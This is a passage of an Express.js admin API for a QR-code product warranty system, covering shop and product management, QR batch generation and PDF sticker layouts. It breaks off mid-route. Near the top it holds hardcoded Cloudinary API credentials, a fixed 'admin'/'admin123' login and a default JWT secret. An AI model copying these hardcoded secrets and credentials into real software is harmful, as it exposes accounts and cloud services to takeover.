import express from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { v4 as uuidv4 } from 'uuid';
import QRCode from 'qrcode';
import PDFDocument from 'pdfkit';
import { v2 as cloudinary } from 'cloudinary';
import multer from 'multer';
import { adminAuth } from '../middleware/auth.js';
import Shop from '../models/Shop.js';
import Product from '../models/Product.js';
import QRCodeModel from '../models/QRCode.js';
import Category from '../models/Category.js';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const router = express.Router();

// Configure Cloudinary
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME || 'dfyxlsguh',
  api_key: process.env.CLOUDINARY_API_KEY || '137121718574342',
  api_secret: process.env.CLOUDINARY_API_SECRET || 'ngxrPShRMj_eL7f7jZW65mLewoI'
});

// Configure multer for file uploads
const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
});

// Admin login (hardcoded for demo)
router.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  if (username === 'admin' && password === 'admin123') {
    const token = jwt.sign(
      { type: 'admin', username: 'admin' },
      process.env.JWT_SECRET || 'your-super-secret-jwt-key-change-this-in-production',
      { expiresIn: '24h' }
    );
    res.json({ token, message: 'Login successful' });
  } else {
    res.status(401).json({ message: 'Invalid credentials' });
  }
});

// Dashboard stats
router.get('/dashboard', adminAuth, async (req, res) => {
  try {
    const totalShops = await Shop.countDocuments();
    const totalProducts = await Product.countDocuments();
    const totalQRCodes = await QRCodeModel.countDocuments();
    const activatedQRCodes = await QRCodeModel.countDocuments({ isActivated: true });
    
    // Calculate today's activations
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const todayActivations = await QRCodeModel.countDocuments({
      isActivated: true,
      activationDate: { $gte: today }
    });
    
    // Get top products by activation count
    const topProducts = await QRCodeModel.aggregate([
      { $match: { isActivated: true } },
      { $group: { _id: '$productId', activationCount: { $sum: 1 } } },
      { $sort: { activationCount: -1 } },
      { $limit: 5 },
      {
        $lookup: {
          from: 'products',
          localField: '_id',
          foreignField: 'productId',
          as: 'product'
        }
      },
      { $unwind: '$product' },
      {
        $project: {
          productName: '$product.productName',
          activationCount: 1,
          imageUrl: '$product.imageUrl'
        }
      }
    ]);
    
    // Get weekly activation trend (last 7 days)
    const weeklyActivations = [];
    for (let i = 6; i >= 0; i--) {
      const date = new Date();
      date.setDate(date.getDate() - i);
      date.setHours(0, 0, 0, 0);
      
      const nextDate = new Date(date);
      nextDate.setDate(nextDate.getDate() + 1);
      
      const count = await QRCodeModel.countDocuments({
        isActivated: true,
        activationDate: { $gte: date, $lt: nextDate }
      });
      
      weeklyActivations.push({
        date: date.toISOString(),
        count
      });
    }
    
    res.json({
      totalShops,
      totalProducts,
      totalQRCodes,
      activatedQRCodes,
      todayActivations,
      topProducts,
      weeklyActivations
    });
  } catch (error) {
    console.error('Dashboard error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Shop management
router.get('/shops', adminAuth, async (req, res) => {
  try {
    const shops = await Shop.find().select('-password');
    res.json(shops);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.post('/shops', adminAuth, async (req, res) => {
  try {
    const { shopName, ownerName, phoneNumber, password } = req.body;
    
    // Validate required fields
    if (!shopName || !ownerName || !phoneNumber || !password) {
      return res.status(400).json({ 
        message: 'All fields are required: shopName, ownerName, phoneNumber, password' 
      });
    }
    
    // Check if shop with same name already exists
    const existingShop = await Shop.findOne({ shopName });
    if (existingShop) {
      return res.status(400).json({ message: 'A shop with this name already exists' });
    }
    
    const shopId = `SHOP${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
    const hashedPassword = await bcrypt.hash(password, 10);
    
    const shop = new Shop({
      shopId,
      shopName,
      ownerName,
      phoneNumber,
      password: hashedPassword
    });
    
    await shop.save();
    console.log('Shop created successfully:', shop.shopId);
    res.status(201).json({ 
      message: 'Shop created successfully', 
      shop: { ...shop.toObject(), password: undefined } 
    });
  } catch (error) {
    console.error('Error creating shop:', error);
    res.status(500).json({ 
      message: 'Server error', 
      error: error.message,
      details: 'Check if MongoDB is running and accessible'
    });
  }
});

router.put('/shops/:id', adminAuth, async (req, res) => {
  try {
    const { shopName, ownerName, phoneNumber, password } = req.body;
    const updateData = { shopName, ownerName, phoneNumber };
    
    if (password) {
      updateData.password = await bcrypt.hash(password, 10);
    }
    
    const shop = await Shop.findByIdAndUpdate(req.params.id, updateData, { new: true }).select('-password');
    res.json({ message: 'Shop updated successfully', shop });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.delete('/shops/:id', adminAuth, async (req, res) => {
  try {
    await Shop.findByIdAndDelete(req.params.id);
    res.json({ message: 'Shop deleted successfully' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Product management
router.get('/products', adminAuth, async (req, res) => {
  try {
    const products = await Product.find();
    res.json(products);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.post('/products', adminAuth, upload.single('image'), async (req, res) => {
  try {
    const { productName, manufacturer, category, warrantyDuration } = req.body;
    
    if (!req.file) {
      return res.status(400).json({ message: 'Product image is required' });
    }
    
    // Upload image to Cloudinary
    const result = await new Promise((resolve, reject) => {
      cloudinary.uploader.upload_stream(
        { resource_type: 'auto' },
        (error, result) => {
          if (error) reject(error);
          else resolve(result);
        }
      ).end(req.file.buffer);
    });
    
    const productId = `PROD${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
    
    const product = new Product({
      productId,
      productName,
      manufacturer,
      category,
      imageUrl: result.secure_url,
      warrantyDuration: parseInt(warrantyDuration) || 365
    });
    
    await product.save();
    res.status(201).json({ message: 'Product created successfully', product });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.put('/products/:id', adminAuth, upload.single('image'), async (req, res) => {
  try {
    const { productName, manufacturer, category, warrantyDuration } = req.body;
    const updateData = { productName, manufacturer, category, warrantyDuration: parseInt(warrantyDuration) || 365 };
    
    if (req.file) {
      const result = await new Promise((resolve, reject) => {
        cloudinary.uploader.upload_stream(
          { resource_type: 'auto' },
          (error, result) => {
            if (error) reject(error);
            else resolve(result);
          }
        ).end(req.file.buffer);
      });
      updateData.imageUrl = result.secure_url;
    }
    
    const product = await Product.findByIdAndUpdate(req.params.id, updateData, { new: true });
    res.json({ message: 'Product updated successfully', product });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.delete('/products/:id', adminAuth, async (req, res) => {
  try {
    await Product.findByIdAndDelete(req.params.id);
    res.json({ message: 'Product deleted successfully' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// QR Code management
router.get('/qrcodes', adminAuth, async (req, res) => {
  try {
    const qrcodes = await QRCodeModel.find();
    res.json(qrcodes);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.get('/qrcodes/batches', adminAuth, async (req, res) => {
  try {
    // First, handle QR codes without batchId (migration)
    const qrcodesWithoutBatch = await QRCodeModel.find({ batchId: { $exists: false } });
    if (qrcodesWithoutBatch.length > 0) {
      // Group by productId and createdAt (within 1 hour) to create batches
      const groupedByProduct = {};
      qrcodesWithoutBatch.forEach(qr => {
        const key = qr.productId;
        if (!groupedByProduct[key]) {
          groupedByProduct[key] = [];
        }
        groupedByProduct[key].push(qr);
      });

      // Create batches for each group
      for (const [productId, qrcodes] of Object.entries(groupedByProduct)) {
        const batchId = `BATCH_LEGACY_${Date.now()}_${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
        await QRCodeModel.updateMany(
          { _id: { $in: qrcodes.map(qr => qr._id) } },
          { batchId }
        );
      }
    }

    const batches = await QRCodeModel.aggregate([
      {
        $group: {
          _id: '$batchId',
          productId: { $first: '$productId' },
          count: { $sum: 1 },
          activatedCount: {
            $sum: { $cond: ['$isActivated', 1, 0] }
          },
          createdAt: { $first: '$createdAt' },
          assignedCount: {
            $sum: { $cond: [{ $ne: ['$assignedShopId', null] }, 1, 0] }
          }
        }
      },
      {
        $sort: { createdAt: -1 }
      }
    ]);
    
    res.json(batches);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.get('/qrcodes/batch/:batchId', adminAuth, async (req, res) => {
  try {
    const { batchId } = req.params;
    const qrcodes = await QRCodeModel.find({ batchId });
    res.json(qrcodes);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.post('/qrcodes/generate', adminAuth, async (req, res) => {
  try {
    const { productId, quantity } = req.body;
    
    const product = await Product.findOne({ productId });
    if (!product) {
      return res.status(404).json({ message: 'Product not found' });
    }
    
    // Generate a unique batch ID for this generation task
    const batchId = `BATCH_${Date.now()}_${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
    
    const qrcodes = [];
    for (let i = 0; i < quantity; i++) {
      const serialNumber = Math.random().toString(36).substr(2, 8).toUpperCase();
      const qrcode = new QRCodeModel({
        serialNumber,
        productId,
        batchId
      });
      await qrcode.save();
      qrcodes.push(qrcode);
    }
    
    res.json({ 
      message: 'QR codes generated successfully', 
      qrcodes,
      batchId,
      batchInfo: {
        batchId,
        productName: product.productName,
        quantity,
        generatedAt: new Date().toISOString()
      }
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.post('/qrcodes/assign', adminAuth, async (req, res) => {
  try {
    const { qrIds, shopId } = req.body;
    
    await QRCodeModel.updateMany(
      { _id: { $in: qrIds } },
      { assignedShopId: shopId }
    );
    
    res.json({ message: 'QR codes assigned successfully' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Updated Download batch QR codes as PDF (A4 sticker layout, duplicate option)
router.get('/qrcodes/download-pdf/:productId', adminAuth, async (req, res) => {
  try {
    const { productId } = req.params;
    const duplicate = req.query.duplicate === 'true';
    let qrcodes = await QRCodeModel.find({ productId });
    // Remove duplicates by serialNumber
    const seen = new Set();
    qrcodes = qrcodes.filter(qr => {
      if (seen.has(qr.serialNumber)) return false;
      seen.add(qr.serialNumber);
      return true;
    });
    const product = await Product.findOne({ productId });
    if (!product) {
      return res.status(404).json({ message: 'Product not found' });
    }
    // --- Sticker layout on A4 ---
    const pageWidth = 595.28; // A4 width in points
    const pageHeight = 841.89; // A4 height in points
    const margin = 40;
    const stickerSizePoints = 72; // 1 inch
    const borderWidthPoints = 0.5;
    const qrCodePaddingPoints = 4;
    const serialNumberHeightPoints = 12;
    const qrCodeSizePoints = Math.max(20, stickerSizePoints - (2 * qrCodePaddingPoints) - serialNumberHeightPoints);
    const verticalSpacingPoints = 0.05 * 72;
    const horizontalSpacingPoints = 0;
    // Each pair takes 2 stickers horizontally + spacing
    const pairWidthPoints = (stickerSizePoints * 2) + horizontalSpacingPoints;
    const pairHeightPoints = stickerSizePoints + verticalSpacingPoints;
    const pairsPerRow = Math.floor((pageWidth - 2 * margin) / pairWidthPoints);
    const pairsPerColumn = Math.floor((pageHeight - 2 * margin) / pairHeightPoints);
    const pairsPerPage = pairsPerRow * pairsPerColumn;
    const stickersPerRow = Math.floor((pageWidth - 2 * margin) / stickerSizePoints);
    const stickersPerColumn = Math.floor((pageHeight - 2 * margin) / stickerSizePoints);
    const stickersPerPage = stickersPerRow * stickersPerColumn;
    const doc = new PDFDocument({ size: [pageWidth, pageHeight], layout: 'portrait' });
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', `attachment; filename="${product.productName}-QRCodes.pdf"`);
    doc.pipe(res);
    if (duplicate) {
      // Group QR codes into pairs (each QR code gets duplicated)
      const qrPairs = qrcodes.map((qr, i) => ({ qrcode: qr, pairIndex: i }));
      let currentPairIndex = 0;
      for (let i = 0; i < qrPairs.length; i++) {
        const pair = qrPairs[i];
        if (currentPairIndex > 0 && currentPairIndex % pairsPerPage === 0) {
          doc.addPage();
          currentPairIndex = 0;
        }
        const pagePairIndex = currentPairIndex % pairsPerPage;
        const row = Math.floor(pagePairIndex / pairsPerRow);
        const col = pagePairIndex % pairsPerRow;
        const pairStartX = margin + col * pairWidthPoints;
        const pairStartY = margin + row * pairHeightPoints;
        const qrUrl = `${process.env.FRONTEND_URL || 'http://localhost:3000'}/qr/${pair.qrcode.serialNumber}`;
        try {
          const qrCodeDataUrl = await QRCode.toDataURL(qrUrl, { width: qrCodeSizePoints, margin: 0 });
          const qrImageBuffer = Buffer.from(qrCodeDataUrl.split(',')[1], 'base64');
          for (let stickerIndex = 0; stickerIndex < 2; stickerIndex++) {
            const stickerX = pairStartX + (stickerIndex * stickerSizePoints);
            const stickerY = pairStartY;
            doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
              .lineWidth(borderWidthPoints)
              .strokeColor('#000000')
              .stroke();
            const topMargin = 6;
            const extraMargin = 2;
            const qrStartX = stickerX + (stickerSizePoints - qrCodeSizePoints) / 2;
            const qrStartY = stickerY + topMargin;
            doc.image(qrImageBuffer, qrStartX, qrStartY, { width: qrCodeSizePoints, height: qrCodeSizePoints });
            const serialNumberY = qrStartY + qrCodeSizePoints + extraMargin;
            doc.fontSize(7)
              .fillColor('#000000')
              .text(pair.qrcode.serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
          }
        } catch (qrError) {
          for (let stickerIndex = 0; stickerIndex < 2; stickerIndex++) {
            const stickerX = pairStartX + (stickerIndex * stickerSizePoints);
            const stickerY = pairStartY;
            doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
              .lineWidth(borderWidthPoints)
              .strokeColor('#cccccc')
              .stroke();
            const qrStartX = stickerX + qrCodePaddingPoints;
            const qrStartY = stickerY + qrCodePaddingPoints;
            doc.fontSize(6)
              .fillColor('#666666')
              .text('QR Error', qrStartX, qrStartY + qrCodeSizePoints / 2 - 3, { width: qrCodeSizePoints, align: 'center' });
            const serialNumberY = stickerY + stickerSizePoints - serialNumberHeightPoints - 2;
            doc.fontSize(6)
              .fillColor('#000000')
              .text(pair.qrcode.serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
          }
        }
        currentPairIndex++;
      }
    } else {
      // No duplicate: each QR code only once per sticker
      let currentStickerIndex = 0;
      for (let i = 0; i < qrcodes.length; i++) {
        if (currentStickerIndex > 0 && currentStickerIndex % stickersPerPage === 0) {
          doc.addPage();
          currentStickerIndex = 0;
        }
        const pageStickerIndex = currentStickerIndex % stickersPerPage;
        const row = Math.floor(pageStickerIndex / stickersPerRow);
        const col = pageStickerIndex % stickersPerRow;
        const stickerX = margin + col * stickerSizePoints;
        const stickerY = margin + row * stickerSizePoints;
        const qrUrl = `${process.env.FRONTEND_URL || 'http://localhost:3000'}/qr/${qrcodes[i].serialNumber}`;
        try {
          const qrCodeDataUrl = await QRCode.toDataURL(qrUrl, { width: qrCodeSizePoints, margin: 0 });
          const qrImageBuffer = Buffer.from(qrCodeDataUrl.split(',')[1], 'base64');
          doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
            .lineWidth(borderWidthPoints)
            .strokeColor('#000000')
            .stroke();
          const topMargin = 6;
          const extraMargin = 2;
          const qrStartX = stickerX + (stickerSizePoints - qrCodeSizePoints) / 2;
          const qrStartY = stickerY + topMargin;
          doc.image(qrImageBuffer, qrStartX, qrStartY, { width: qrCodeSizePoints, height: qrCodeSizePoints });
          const serialNumberY = qrStartY + qrCodeSizePoints + extraMargin;
          doc.fontSize(7)
            .fillColor('#000000')
            .text(qrcodes[i].serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
        } catch (qrError) {
          doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
            .lineWidth(borderWidthPoints)
            .strokeColor('#cccccc')
            .stroke();
          const qrStartX = stickerX + qrCodePaddingPoints;
          const qrStartY = stickerY + qrCodePaddingPoints;
          doc.fontSize(6)
            .fillColor('#666666')
            .text('QR Error', qrStartX, qrStartY + qrCodeSizePoints / 2 - 3, { width: qrCodeSizePoints, align: 'center' });
          const serialNumberY = stickerY + stickerSizePoints - serialNumberHeightPoints - 2;
          doc.fontSize(6)
            .fillColor('#000000')
            .text(qrcodes[i].serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
        }
        currentStickerIndex++;
      }
    }
    doc.end();
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Updated Download selected QR codes as PDF (A4 sticker layout, duplicate option)
router.post('/qrcodes/download-selected-pdf', adminAuth, async (req, res) => {
  try {
    let { qrIds, duplicate } = req.body;
    if (!qrIds || !Array.isArray(qrIds) || qrIds.length === 0) {
      return res.status(400).json({ message: 'No QR codes selected' });
    }
    // Remove duplicates
    qrIds = Array.from(new Set(qrIds));
    const qrcodes = await QRCodeModel.find({ _id: { $in: qrIds } });
    if (qrcodes.length === 0) {
      return res.status(404).json({ message: 'No QR codes found' });
    }
    const product = await Product.findOne({ productId: qrcodes[0].productId });
    if (!product) {
      return res.status(404).json({ message: 'Product not found' });
    }
    // --- Sticker layout on A4 ---
    const pageWidth = 595.28; // A4 width in points
    const pageHeight = 841.89; // A4 height in points
    const margin = 40;
    const stickerSizePoints = 72; // 1 inch
    const borderWidthPoints = 0.5;
    const qrCodePaddingPoints = 4;
    const serialNumberHeightPoints = 12;
    const qrCodeSizePoints = Math.max(20, stickerSizePoints - (2 * qrCodePaddingPoints) - serialNumberHeightPoints);
    const verticalSpacingPoints = 0.05 * 72;
    const horizontalSpacingPoints = 0;
    // Each pair takes 2 stickers horizontally + spacing
    const pairWidthPoints = (stickerSizePoints * 2) + horizontalSpacingPoints;
    const pairHeightPoints = stickerSizePoints + verticalSpacingPoints;
    const pairsPerRow = Math.floor((pageWidth - 2 * margin) / pairWidthPoints);
    const pairsPerColumn = Math.floor((pageHeight - 2 * margin) / pairHeightPoints);
    const pairsPerPage = pairsPerRow * pairsPerColumn;
    const stickersPerRow = Math.floor((pageWidth - 2 * margin) / stickerSizePoints);
    const stickersPerColumn = Math.floor((pageHeight - 2 * margin) / stickerSizePoints);
    const stickersPerPage = stickersPerRow * stickersPerColumn;
    const doc = new PDFDocument({ size: [pageWidth, pageHeight], layout: 'portrait' });
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', `attachment; filename="Selected-QRCodes-${product.productName}.pdf"`);
    doc.pipe(res);
    if (duplicate) {
      // Group QR codes into pairs (each QR code gets duplicated)
      const qrPairs = qrcodes.map((qr, i) => ({ qrcode: qr, pairIndex: i }));
      let currentPairIndex = 0;
      for (let i = 0; i < qrPairs.length; i++) {
        const pair = qrPairs[i];
        if (currentPairIndex > 0 && currentPairIndex % pairsPerPage === 0) {
          doc.addPage();
          currentPairIndex = 0;
        }
        const pagePairIndex = currentPairIndex % pairsPerPage;
        const row = Math.floor(pagePairIndex / pairsPerRow);
        const col = pagePairIndex % pairsPerRow;
        const pairStartX = margin + col * pairWidthPoints;
        const pairStartY = margin + row * pairHeightPoints;
        const qrUrl = `${process.env.FRONTEND_URL || 'http://localhost:3000'}/qr/${pair.qrcode.serialNumber}`;
        try {
          const qrCodeDataUrl = await QRCode.toDataURL(qrUrl, { width: qrCodeSizePoints, margin: 0 });
          const qrImageBuffer = Buffer.from(qrCodeDataUrl.split(',')[1], 'base64');
          for (let stickerIndex = 0; stickerIndex < 2; stickerIndex++) {
            const stickerX = pairStartX + (stickerIndex * stickerSizePoints);
            const stickerY = pairStartY;
            doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
              .lineWidth(borderWidthPoints)
              .strokeColor('#000000')
              .stroke();
            const topMargin = 6;
            const extraMargin = 2;
            const qrStartX = stickerX + (stickerSizePoints - qrCodeSizePoints) / 2;
            const qrStartY = stickerY + topMargin;
            doc.image(qrImageBuffer, qrStartX, qrStartY, { width: qrCodeSizePoints, height: qrCodeSizePoints });
            const serialNumberY = qrStartY + qrCodeSizePoints + extraMargin;
            doc.fontSize(7)
              .fillColor('#000000')
              .text(pair.qrcode.serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
          }
        } catch (qrError) {
          for (let stickerIndex = 0; stickerIndex < 2; stickerIndex++) {
            const stickerX = pairStartX + (stickerIndex * stickerSizePoints);
            const stickerY = pairStartY;
            doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
              .lineWidth(borderWidthPoints)
              .strokeColor('#cccccc')
              .stroke();
            const qrStartX = stickerX + qrCodePaddingPoints;
            const qrStartY = stickerY + qrCodePaddingPoints;
            doc.fontSize(6)
              .fillColor('#666666')
              .text('QR Error', qrStartX, qrStartY + qrCodeSizePoints / 2 - 3, { width: qrCodeSizePoints, align: 'center' });
            const serialNumberY = stickerY + stickerSizePoints - serialNumberHeightPoints - 2;
            doc.fontSize(6)
              .fillColor('#000000')
              .text(pair.qrcode.serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
          }
        }
        currentPairIndex++;
      }
    } else {
      // No duplicate: each QR code only once per sticker
      let currentStickerIndex = 0;
      for (let i = 0; i < qrcodes.length; i++) {
        if (currentStickerIndex > 0 && currentStickerIndex % stickersPerPage === 0) {
          doc.addPage();
          currentStickerIndex = 0;
        }
        const pageStickerIndex = currentStickerIndex % stickersPerPage;
        const row = Math.floor(pageStickerIndex / stickersPerRow);
        const col = pageStickerIndex % stickersPerRow;
        const stickerX = margin + col * stickerSizePoints;
        const stickerY = margin + row * stickerSizePoints;
        const qrUrl = `${process.env.FRONTEND_URL || 'http://localhost:3000'}/qr/${qrcodes[i].serialNumber}`;
        try {
          const qrCodeDataUrl = await QRCode.toDataURL(qrUrl, { width: qrCodeSizePoints, margin: 0 });
          const qrImageBuffer = Buffer.from(qrCodeDataUrl.split(',')[1], 'base64');
          doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
            .lineWidth(borderWidthPoints)
            .strokeColor('#000000')
            .stroke();
          const topMargin = 6;
          const extraMargin = 2;
          const qrStartX = stickerX + (stickerSizePoints - qrCodeSizePoints) / 2;
          const qrStartY = stickerY + topMargin;
          doc.image(qrImageBuffer, qrStartX, qrStartY, { width: qrCodeSizePoints, height: qrCodeSizePoints });
          const serialNumberY = qrStartY + qrCodeSizePoints + extraMargin;
          doc.fontSize(7)
            .fillColor('#000000')
            .text(qrcodes[i].serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
        } catch (qrError) {
          doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
            .lineWidth(borderWidthPoints)
            .strokeColor('#cccccc')
            .stroke();
          const qrStartX = stickerX + qrCodePaddingPoints;
          const qrStartY = stickerY + qrCodePaddingPoints;
          doc.fontSize(6)
            .fillColor('#666666')
            .text('QR Error', qrStartX, qrStartY + qrCodeSizePoints / 2 - 3, { width: qrCodeSizePoints, align: 'center' });
          const serialNumberY = stickerY + stickerSizePoints - serialNumberHeightPoints - 2;
          doc.fontSize(6)
            .fillColor('#000000')
            .text(qrcodes[i].serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
        }
        currentStickerIndex++;
      }
    }
    doc.end();
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Generate sticker sheet PDF (13x19 inches, duplicate option)
router.post('/qrcodes/sticker-sheet', adminAuth, async (req, res) => {
  try {
    const { qrIds, verticalSpacing = 0.05, horizontalSpacing = 0, duplicate = true } = req.body;
    if (!qrIds || !Array.isArray(qrIds) || qrIds.length === 0) {
      return res.status(400).json({ message: 'No QR codes selected' });
    }
    const qrcodes = await QRCodeModel.find({ _id: { $in: qrIds } });
    if (qrcodes.length === 0) {
      return res.status(404).json({ message: 'No QR codes found' });
    }
    const product = await Product.findOne({ productId: qrcodes[0].productId });
    if (!product) {
      return res.status(404).json({ message: 'Product not found' });
    }
    // --- Sticker layout on 13x19 inches ---
    const pageWidth = 13 * 72; // 936 points
    const pageHeight = 19 * 72; // 1368 points
    const margin = 40;
    const stickerSizePoints = 72; // 1 inch
    const borderWidthPoints = 0.5;
    const qrCodePaddingPoints = 4;
    const serialNumberHeightPoints = 12;
    const qrCodeSizePoints = Math.max(20, stickerSizePoints - (2 * qrCodePaddingPoints) - serialNumberHeightPoints);
    const verticalSpacingPoints = verticalSpacing * 72;
    const horizontalSpacingPoints = horizontalSpacing * 72;
    // Each pair takes 2 stickers horizontally + spacing
    const pairWidthPoints = (stickerSizePoints * 2) + horizontalSpacingPoints;
    const pairHeightPoints = stickerSizePoints + verticalSpacingPoints;
    const pairsPerRow = Math.floor((pageWidth - 2 * margin) / pairWidthPoints);
    const pairsPerColumn = Math.floor((pageHeight - 2 * margin) / pairHeightPoints);
    const pairsPerPage = pairsPerRow * pairsPerColumn;
    const stickersPerRow = Math.floor((pageWidth - 2 * margin) / stickerSizePoints);
    const stickersPerColumn = Math.floor((pageHeight - 2 * margin) / stickerSizePoints);
    const stickersPerPage = stickersPerRow * stickersPerColumn;
    const doc = new PDFDocument({ size: [pageWidth, pageHeight], layout: 'portrait' });
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', `attachment; filename="StickerSheet-${product.productName}.pdf"`);
    doc.pipe(res);
    if (duplicate) {
      // Group QR codes into pairs (each QR code gets duplicated)
      const qrPairs = qrcodes.map((qr, i) => ({ qrcode: qr, pairIndex: i }));
      let currentPairIndex = 0;
      for (let i = 0; i < qrPairs.length; i++) {
        const pair = qrPairs[i];
        if (currentPairIndex > 0 && currentPairIndex % pairsPerPage === 0) {
          doc.addPage();
          currentPairIndex = 0;
        }
        const pagePairIndex = currentPairIndex % pairsPerPage;
        const row = Math.floor(pagePairIndex / pairsPerRow);
        const col = pagePairIndex % pairsPerRow;
        const pairStartX = margin + col * pairWidthPoints;
        const pairStartY = margin + row * pairHeightPoints;
        const qrUrl = `${process.env.FRONTEND_URL || 'http://localhost:3000'}/qr/${pair.qrcode.serialNumber}`;
        try {
          const qrCodeDataUrl = await QRCode.toDataURL(qrUrl, { width: qrCodeSizePoints, margin: 0 });
          const qrImageBuffer = Buffer.from(qrCodeDataUrl.split(',')[1], 'base64');
          for (let stickerIndex = 0; stickerIndex < 2; stickerIndex++) {
            const stickerX = pairStartX + (stickerIndex * stickerSizePoints);
            const stickerY = pairStartY;
            doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
              .lineWidth(borderWidthPoints)
              .strokeColor('#000000')
              .stroke();
            const topMargin = 6;
            const extraMargin = 2;
            const qrStartX = stickerX + (stickerSizePoints - qrCodeSizePoints) / 2;
            const qrStartY = stickerY + topMargin;
            doc.image(qrImageBuffer, qrStartX, qrStartY, { width: qrCodeSizePoints, height: qrCodeSizePoints });
            const serialNumberY = qrStartY + qrCodeSizePoints + extraMargin;
            doc.fontSize(7)
              .fillColor('#000000')
              .text(pair.qrcode.serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
          }
        } catch (qrError) {
          for (let stickerIndex = 0; stickerIndex < 2; stickerIndex++) {
            const stickerX = pairStartX + (stickerIndex * stickerSizePoints);
            const stickerY = pairStartY;
            doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
              .lineWidth(borderWidthPoints)
              .strokeColor('#cccccc')
              .stroke();
            const qrStartX = stickerX + qrCodePaddingPoints;
            const qrStartY = stickerY + qrCodePaddingPoints;
            doc.fontSize(6)
              .fillColor('#666666')
              .text('QR Error', qrStartX, qrStartY + qrCodeSizePoints / 2 - 3, { width: qrCodeSizePoints, align: 'center' });
            const serialNumberY = stickerY + stickerSizePoints - serialNumberHeightPoints - 2;
            doc.fontSize(6)
              .fillColor('#000000')
              .text(pair.qrcode.serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
          }
        }
        currentPairIndex++;
      }
    } else {
      // No duplicate: each QR code only once per sticker
      let currentStickerIndex = 0;
      for (let i = 0; i < qrcodes.length; i++) {
        if (currentStickerIndex > 0 && currentStickerIndex % stickersPerPage === 0) {
          doc.addPage();
          currentStickerIndex = 0;
        }
        const pageStickerIndex = currentStickerIndex % stickersPerPage;
        const row = Math.floor(pageStickerIndex / stickersPerRow);
        const col = pageStickerIndex % stickersPerRow;
        const stickerX = margin + col * stickerSizePoints;
        const stickerY = margin + row * stickerSizePoints;
        const qrUrl = `${process.env.FRONTEND_URL || 'http://localhost:3000'}/qr/${qrcodes[i].serialNumber}`;
        try {
          const qrCodeDataUrl = await QRCode.toDataURL(qrUrl, { width: qrCodeSizePoints, margin: 0 });
          const qrImageBuffer = Buffer.from(qrCodeDataUrl.split(',')[1], 'base64');
          doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
            .lineWidth(borderWidthPoints)
            .strokeColor('#000000')
            .stroke();
          const topMargin = 6;
          const extraMargin = 2;
          const qrStartX = stickerX + (stickerSizePoints - qrCodeSizePoints) / 2;
          const qrStartY = stickerY + topMargin;
          doc.image(qrImageBuffer, qrStartX, qrStartY, { width: qrCodeSizePoints, height: qrCodeSizePoints });
          const serialNumberY = qrStartY + qrCodeSizePoints + extraMargin;
          doc.fontSize(7)
            .fillColor('#000000')
            .text(qrcodes[i].serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
        } catch (qrError) {
          doc.rect(stickerX, stickerY, stickerSizePoints, stickerSizePoints)
            .lineWidth(borderWidthPoints)
            .strokeColor('#cccccc')
            .stroke();
          const qrStartX = stickerX + qrCodePaddingPoints;
          const qrStartY = stickerY + qrCodePaddingPoints;
          doc.fontSize(6)
            .fillColor('#666666')
            .text('QR Error', qrStartX, qrStartY + qrCodeSizePoints / 2 - 3, { width: qrCodeSizePoints, align: 'center' });
          const serialNumberY = stickerY + stickerSizePoints - serialNumberHeightPoints - 2;
